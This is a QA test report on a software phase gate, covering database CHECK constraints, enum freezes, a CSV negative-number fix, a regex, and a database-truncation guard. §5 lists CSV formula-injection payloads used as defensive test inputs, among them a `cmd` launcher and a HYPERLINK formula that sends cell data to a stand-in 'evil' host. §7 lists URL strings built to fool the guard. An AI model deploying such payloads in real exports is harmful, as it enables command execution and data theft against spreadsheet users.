# Phase 6.0 — Schema & Separation Gate · QA Test Report

- **Author**: Senior QA Test Engineer (Loop Engineering position #6)
- **Date**: 2026-07-20
- **Branch**: `phase6.0-schema-separation-gate` @ `56845d9`
- **Scope**: behavioural QA of the Phase 6.0 gate — migration DDL, the five
  separation layers, the byte-identity proof, the CSV negative-number fix, the
  `statementRef` pattern, the e2e truncation guard, and demo-stack regression.
- **Verdict**: **SIGNED OFF** (with three tracked findings, none Critical)

> This is the first independent QA pass on Phase 6.0. The previous version of
> this file was written by the implementing developer agent in the same commit
> as the code, and carried a self-assigned "SIGNED OFF". None of its claims were
> reused. Everything below was executed and observed by me; where I could not
> verify something, I say so.

---

## 1. What I executed

| # | Command | Result |
|---|---------|--------|
| 1 | `npm test` (backend) | **45 suites / 467 tests passed**, 13.3 s |
| 2 | `DATABASE_URL=…/content_hub_e2e npm run test:e2e` | **1 suite / 14 tests passed**, 2.8 s |
| 3 | `npm run lint` | clean, `--max-warnings 0` |
| 4 | Contamination injection into `DashboardService.revenue()`, e2e re-run | **harness failed as required** (see §2) |
| 5 | 19 raw-SQL constraint probes vs live `content_hub_e2e` | all as specified (see §3) |
| 6 | Live enum inspection, both databases | frozen (see §4) |
| 7 | Direct `escapeCsvField` / `toCsv` probes + existing suite | pass (see §5) |
| 8 | Direct `COMMERCE_STATEMENT_REF_PATTERN` probes, 17 cases | pass (see §6) |
| 9 | 13 adversarial probes against `assertDisposableDatabase` | all rejected (see §7) |
| 10 | Demo-stack API regression + log scan | pass (see §8) |

Both suites were re-run at the end against an unmodified tree, reproducing
identical counts (467 / 14). `git status` shows no source file modified by me.

---

## 2. Is the byte-identity proof genuine? — **Yes**

This was the primary question, and it does not survive on documentation alone,
so I tried to break it.

**The fixture is genuinely adversarial.** Reading
`backend/src/testing/e2e/commerce-fixture.ts`, every claim the brief makes is
actually implemented, not just asserted in a comment:

- Conversions are attributed to `PAYOUT_IDS.postBTiktok` and
  `PAYOUT_IDS.postAFacebook` — the *same* post rows the payout fixture measures.
- The placement sits on `PAYOUT_IDS.contentA` and points at `PAYOUT_IDS.assetA`
  — the same content and asset the payout side reads.
- Commission is 48,000 THB gross against 2,296.50 THB payout revenue — 20×, and
  the test asserts the ratio (`> PAYOUT_TOTAL_REVENUE_THB * 10`) so the fixture
  cannot silently decay into a decorative one.
- There is a real negative reversal (`-4500.00`) with `reversalOfId` set.
- `rankAllContent()` is called *after* the commerce seed, so the re-rank happens
  with contamination present — a first pass on a clean DB would prove nothing.

**The break test.** I temporarily edited
`backend/src/modules/dashboard/dashboard.service.ts` to fold a commerce sum into
the payout total:

```ts
const commerceContamination = await (this.prisma as any).commerceConversion.aggregate({
  _sum: { commissionAmount: true },
});
// …
totalRevenue: round2(sumTally(latest).revenue + commerceSum),
```

Re-running the harness:

```
✕ seeds commerce, re-ranks, and every payout artefact is byte-identical (56 ms)
  Expected: true
  Received: false
Tests: 1 failed, 13 passed, 14 total
```

The proof **caught it**. It is not vacuous. Note the shape of the catch: the
other 13 tests stayed green and only the byte-identity assertion flipped, which
is exactly the diagnostic behaviour you want.

**Scratch edit reverted.** I restored the file from a backup and verified by
checksum: `md5` is `15a71e6153c19b05971e8fc62b946fc4` before and after, and
`git status` reports the working tree clean of any source change.

**The structural claim also holds.** I verified in `prisma/schema.prisma` that
`postId`, `contentId`, `sourceAssetId` and `recordedBy` on the commerce models
are plain scalar `String @db.Uuid` columns with **no `@relation`**, and that no
payout model (`Post`, `Content`, `ContentAsset`, `Metric`, `RankingScore`,
`User`) carries a commerce back-relation. So
`prisma.post.findMany({ include: { productAnchors: true } })` is genuinely
unspellable, not merely discouraged — while Postgres still enforces the FKs.
`npm run lint` confirms the `no-restricted-imports` zones are active, and
`grep` finds no commerce import anywhere under `dashboard/`, `reports/`,
`ranking/` or `metrics/` (one comment mentions the word; no code does).

**The gap, which the code itself declares.** `capture-baseline.ts` documents
that it calls the read *services* directly rather than going through HTTP, so a
controller that injected a commerce service and merged a field would not be
caught here. I confirmed this is a real and accurate self-description, not a
hidden weakness — it is stated in the file header and deferred to 6A.10. Given
6.0 ships no endpoints at all, nothing can exercise that path yet. Tracked as
finding QA-3.

---

## 3. DB-level CHECK constraints — verified with live SQL

Executed against `content_hub_e2e` inside one transaction with savepoints, then
`ROLLBACK` (no data persisted; verified afterwards — all commerce tables 0 rows).
Parent `users` / `contents` / `commerce_products` rows were created inside the
transaction so that FK errors could not masquerade as CHECK results.

| Probe | Expected | Observed |
|-------|----------|----------|
| Shopee placement, `duration_seconds` NULL | reject | `ERROR: … violates check constraint "commerce_placements_shopee_duration_chk"` |
| Shopee, duration **9** | reject | same constraint fired |
| Shopee, duration **61** | reject | same constraint fired |
| Shopee, duration **10** | accept | `INSERT 0 1` |
| Shopee, duration **60** | accept | `INSERT 0 1` |
| `tiktok_shop`, duration NULL | accept | `INSERT 0 1` (rule is Shopee-only, by design) |
| note 201 chars | reject | `commerce_placements_note_len_chk` |
| note 200 chars | accept | `INSERT 0 1` |
| `reversal_of_id = id` | reject | `commerce_conversions_no_self_reversal_chk` |
| currency `thb` | reject | `commerce_conversions_currency_chk` |
| currency `123` | reject | same |
| currency `'TH '` (blank-padded) | reject | same |
| product currency `usd` | reject | `commerce_products_currency_chk` |
| `period_end < period_start` | reject | `commerce_conversions_period_chk` |
| `orders_count = -1` | reject | `commerce_conversions_counts_chk` |
| `statement_ref` 65 chars | reject | `commerce_conversions_statement_ref_len_chk` |
| `anchor_position = -1` | reject | `product_anchors_position_nonneg_chk` |

**The NULL-duration case is the one that matters most** and it is correctly
fail-closed. The migration's `IS NOT NULL` conjunct is doing real work: the
naive `channel <> 'shopee' OR duration BETWEEN 10 AND 60` form would evaluate to
`FALSE OR NULL = NULL`, which Postgres accepts. The shipped constraint rejects
it. Boundaries are inclusive and exact — 9 and 61 out, 10 and 60 in.

One probe I initially mis-wrote (both anchor targets set) actually exercised the
single-target accept path; the both-null case is covered by the e2e suite's
`product_anchors_one_target_chk` test, which I watched pass. I did not
separately prove the both-*set* rejection — see "not tested" in §10.

---

## 4. `Platform` / `AssetPlatform` freeze — verified live

Queried `pg_enum` directly in **both** databases (not the schema file):

```
AssetPlatform            = facebook,youtube,tiktok,line_oa
Platform                 = facebook,youtube,tiktok,line
CommerceChannel          = shopee,tiktok_shop
CommerceSource           = manual,api
CommercePlacementStatus  = recorded,removed
```

Identical in `content_hub` and `content_hub_e2e`. No `shopee` value on either
platform enum. This is the finding that would have been most expensive to get
wrong — Postgres enum additions are irreversible, and `AssetPlatform` feeds
`RANKED_PLATFORMS_V2`, so a stray value would have enrolled commerce into v2
scoring silently. It did not happen. `enum-freeze.spec.ts` additionally asserts
this against the generated Prisma client, so schema and client are both pinned.

---

## 5. CSV negative numbers — verified by direct exercise

I wrote a throwaway probe against `escapeCsvField` / `toCsv` and ran it
alongside the existing `csv.util.spec.ts` (**21 tests passed**; the existing
injection tests pass **unchanged** — I did not modify them).

Summable negatives (returned bare, no apostrophe): `-250.00`, `-4500.00`,
`-4500`, `-5`, `-0.01`, `-1`, plus `0`, `42`, `3.14`.

Still defanged (apostrophe-prefixed):

| Input | Output |
|-------|--------|
| `=cmd\|' /C calc'!A1` | `'=cmd\|' /C calc'!A1` |
| `-1+1` | `'-1+1` |
| `+x` | `'+x` |
| `@x` | `'@x` |
| `--1` | `'--1` |
| `-1e5` | `'-1e5` |
| `-` / `-.5` / `- 250` | `'-` / `'-.5` / `'- 250` |
| `\t=cmd` | `'\t=cmd` |
| `=HYPERLINK("http://evil/?"&A1)` | `"'=HYPERLINK(""http://evil/?""&A1)"` |

Quoting per RFC 4180 intact: `a"b` → `"a""b"`, `a\nb` → `"a\nb"`, `a,b` →
`"a,b"`. `toCsv` emits CRLF and renders `-4500.00` as a bare summable cell.

Two of my initial expectations were wrong, not the code: `=cmd|' /C calc'!A1`
contains no comma/quote/newline so RFC 4180 quoting correctly does not apply,
and a leading tab is not a CSV special character when the delimiter is a comma.
The `SAFE_NUMERIC` boundary (`/^-?\d+(\.\d+)?$/`) is drawn exactly where the
comment claims — a leading `-` followed only by digits carries no formula.

---

## 6. `statementRef` regex — pattern correct, **but currently enforced nowhere**

The shipped pattern is `/^[A-Za-z0-9][A-Za-z0-9._\-/]{0,63}$/`. I exercised it
directly across 17 cases; **all behaved as specified**:

- Rejects: `John Smith`, `Somchai P`, `somchai@example.com`, `สมชาย` (Thai),
  65 chars, empty, `+66812345678`, `-leading-hyphen`, `.leading-dot`.
- Accepts: `SHP-2026-W27`, `SHP-2026-W28-REV`, `TT.SHOP/2026-07/001`,
  `STMT.2026.07.001`, exactly 64 chars, and `0812345678` (documented residual —
  a digit string is indistinguishable from a statement id by regex).

I specifically probed for trailing-newline bypass (`"SHP-2026-W27\n"`), a common
anchored-regex hole. JS `$` without the `m` flag matches only at end-of-string,
so it is correctly rejected. Length bound is right: 1 + 63 = 64, matching both
`COMMERCE_STATEMENT_REF_MAX_LENGTH` and the DB CHECK.

**However — the service-level enforcement described in the brief does not
exist.** `src/modules/commerce/` contains only `commerce.constants.ts` and its
spec. There is **no `commerce.module.ts`, no service, no DTO**, and
`COMMERCE_STATEMENT_REF_PATTERN` is referenced by nothing but its own unit test.
I confirmed the consequence at the database level: probe T17 inserted
`statement_ref = 'John Smith'` into `commerce_conversions` and **Postgres
accepted it** (`INSERT 0 1`), because the migration deliberately ships only a
length CHECK, not a format one.

To be fair to the implementation, `commerce.constants.ts` is *honest* about
this — lines 174–181 state plainly that enforcement belongs "in the SERVICE, via
an exported `assertStatementRefShape(value)`… **NOT built in the 6.0 gate**",
deferred to 6A.7. So this is a correctly-documented deferral in the code, not a
silent gap. What is inaccurate is (a) the brief's claim that service enforcement
shipped, and (b) the migration comment, which uses the present tense: "The
FORMAT constraint … **is enforced** in the service rather than here" — describing
a service that does not exist. Tracked as QA-1.

Risk today is nil: with no endpoints and no adapter, there is no write path into
the column outside test fixtures. Risk in 6A is real, because the DB was
deliberately left without a format CHECK *on the assumption that the service
would carry it*.

---

## 7. e2e truncation guard — I could not defeat it

`assertDisposableDatabase()` requires both a local host **and** a database name
matching `/(^|_)e2e$/`. I wrote 13 adversarial probes; the guard **rejected every
one** (run alongside the 10 existing regression cases: 23 tests passed).

| Attack | Result |
|--------|--------|
| `…/content_hub?schema=public&x=e2e` (query-string smuggling) | rejected |
| `…/not_e2e_really` | rejected |
| `…/content_hub#e2e` (fragment smuggling) | rejected |
| `…/content_hub/e2e` (second path segment) | rejected |
| `postgresql://e2e:e2e@localhost:5432/content_hub` (creds only) | rejected |
| `…/CONTENT_HUB_E2E` (uppercase — fails closed) | rejected |
| `postgresql:///content_hub?host=/var/run/postgresql` (socket style) | rejected |
| `postgresql://u:p@db.prod.internal:5432/content_hub_e2e` (remote host) | rejected |
| `not a url at all` | rejected |
| `…:5432/` (empty name) | rejected |
| `…/content_hub_e2e_backup` (e2e in the middle) | rejected |
| `…/content_hub_e2e?schema=public` (the intended DB) | **accepted**, correctly |

The query-string and fragment attacks fail because `databaseNameOf()` reads
`URL.pathname`, which excludes both. Parse failures return `''`, which is not
disposable — it fails closed.

**The one real hole is the documented `ALLOW_E2E_TRUNCATE=1` hatch.** It is
checked *before* the name check, so with it set,
`postgresql://…@localhost:5432/content_hub` is accepted and the demo database
gets truncated. I verified this directly. I grepped the repo: it is **not** set
in CI, `docker-compose.yml`, any `.env`, or any script — it exists only in the
guard and in prose. So it is not live-armed. But it reintroduces exactly the
failure mode BUG-P6-01 just cost real data to fix ("localhost is not a
disposability test"), gated on a single env var that a shell profile or a
copy-pasted command could carry. Tracked as QA-2.

I did **not** run truncation against `content_hub` at any point. Every e2e
invocation used the `content_hub_e2e` URL; every SQL probe ran in a rolled-back
transaction.

---

## 8. Demo-stack regression — clean

All four containers healthy. Authenticated with the admin credentials
(`login: 200`) and exercised the payout surfaces:

```
/api/dashboard/overview  -> 200
/api/dashboard/revenue   -> 200
/api/scheduler/overview  -> 200
/api/contents            -> 200
/api/comments            -> 200
/api/reports/revenue.csv -> 200
```

`docker compose logs backend --tail=300` contains **zero** 500s, zero
`Internal server error`, zero unhandled rejections. The only `ERROR` lines are
404s generated by my own first probes at two paths that do not exist
(`/api/health`, `/api/scheduler/queue`) — my error, not the app's.

**Demo database integrity.** `content_hub` holds `users=1`,
`pillar_ratio_policies=3`, `platform_cadence_targets=4` and zero
contents/posts/metrics/comments. I checked whether this was data loss and it is
**not**: `prisma/seed.ts` creates exactly a pillar policy set, cadence targets
and one admin user — it never seeded content. The admin row is timestamped
`04:29:22 UTC`, roughly an hour before my session began (~05:34 UTC), and
`audit_logs` held zero rows until my own login wrote two at `06:01:13`. The
database is in its expected post-seed state and I did not disturb it. Commerce
tables in `content_hub` are empty, as they should be.

Worth noting for DevOps rather than for this gate: the backend container's
healthcheck is a bare TCP connect to port 4000, and there is no `/api/health`
route at all. "healthy" therefore means "the port is open", not "the app can
reach Postgres". Pre-existing and out of Phase 6 scope; noted as QA-4 (Low).

---

## 9. Findings

| ID | Severity | Finding | Repro | Recommendation |
|----|----------|---------|-------|----------------|
| **QA-1** | **Medium** | `statement_ref` format rule is enforced in **no layer**. The regex constant exists but is referenced only by its own test; there is no service, module or DTO. The DB ships a length CHECK only, by deliberate design that assumed a service would carry the format rule. | `INSERT INTO commerce_conversions (…, statement_ref, …) VALUES (…, 'John Smith', …)` against `content_hub_e2e` → `INSERT 0 1`. | Blocking prerequisite for 6A.7, before any write path exists. Export `assertStatementRefShape()` and call it in the service *and* at the adapter seam. Also fix the present-tense migration comment ("is enforced in the service") which describes code that does not exist. |
| **QA-2** | **Medium** | `ALLOW_E2E_TRUNCATE=1` bypasses the database-name check entirely, leaving only the host check — and the demo DB is on localhost. Reintroduces the BUG-P6-01 failure mode behind one env var. | `assertDisposableDatabase('postgresql://…@localhost:5432/content_hub', { ALLOW_E2E_TRUNCATE: '1' })` returns without throwing. | Make the hatch refuse a small deny-list (`content_hub`) regardless, or require the value to be the literal DB name being truncated rather than `1`, so it cannot be set once and forgotten. At minimum log a loud warning on use. Not currently armed anywhere in the repo. |
| **QA-3** | **Low** | Byte-identity proof runs at the service layer, not over HTTP; a controller merging a commerce field would not be caught. | n/a — by design, documented in `capture-baseline.ts`. | Close in 6A.10 with an authenticated supertest harness, as the file itself proposes. No exposure while 6.0 ships zero endpoints. |
| **QA-4** | **Low** | Backend healthcheck is a TCP connect; no `/api/health` route exists. "healthy" does not imply DB connectivity. | `docker inspect` shows `node -e "require('node:net').connect(4000,…)"`. | Pre-existing, out of Phase 6 scope. Raise with DevOps. |

No Critical or High findings. In particular, the two failure modes that would
have been Critical — a vacuous byte-identity proof, and a truncation guard that
can be tricked onto the demo database — were both specifically attacked and both
held.

---

## 10. What I could not test, and honest limits

- **HTTP/controller layer**: no commerce endpoints exist, so nothing to test.
  The payout endpoints were smoke-tested for status codes only, not response
  bodies compared byte-for-byte through HTTP (§2 gap / QA-3).
- **Anchor with *both* targets set**: my probe was mis-written and exercised the
  single-target accept path instead. The both-*null* rejection is covered by the
  e2e suite and passes; the both-set rejection I did not independently prove,
  though `num_nonnulls(post_id, placement_id) = 1` is symmetric and the e2e suite
  covers the constraint's existence.
- **Composite FK 2.2** (link must belong to its own product) and the three
  partial unique indexes: I read the DDL and confirmed they are present in the
  migration, but did not write negative probes for them. The e2e schema
  allow-list test confirms the physical columns match; the *behaviour* of those
  four objects is unverified by me.
- **Migration down/rollback**: not exercised. The migration documents a manual
  rollback procedure; there is no down-migration to run.
- **Load/performance and accessibility**: out of scope for a schema gate; no new
  user-facing surface shipped.
- **`content_hub` truncation behaviour**: deliberately not executed. I reasoned
  about the guard and tested the guard *function* directly, per instruction.

---

## 11. Verdict

**SIGNED OFF** for progression to 6A.

The gate does what it claims. The byte-identity proof is genuine — I broke it on
purpose and it failed correctly, then I reverted and it passed correctly. The
separation is structural rather than merely conventional: the Prisma type graph
has no edge from payout into commerce while Postgres still enforces referential
integrity, and I confirmed both halves independently. Every CHECK constraint I
probed behaves exactly as its comment claims, including the fail-closed
NULL-duration case that is easy to get backwards. The platform enums are frozen
in the live databases. The CSV fix makes reversals summable without
re-opening the injection hole. The truncation guard resisted every attack I
could construct.

The three tracked findings are all forward-looking rather than defects in what
shipped. **QA-1 is a blocking prerequisite for 6A.7** and should be treated as
such: the database was intentionally left without a `statement_ref` format
constraint on the assumption of a service guard that does not yet exist, so the
first commerce write path must not land before that guard does. QA-2 should be
tightened opportunistically. QA-3 is already scheduled for 6A.10.

**Cleanup performed**: the scratch contamination in `dashboard.service.ts` was
reverted and checksum-verified; three temporary probe spec files
(`qa-probe-csv.spec.ts`, `qa-probe-guard.spec.ts`, and a regex script) were
deleted; all SQL probes ran inside a rolled-back transaction and
`content_hub_e2e` was left empty by the suite's own teardown; `content_hub` was
never written to except by one authenticated login. `git status` shows no source
file modified by this QA pass.
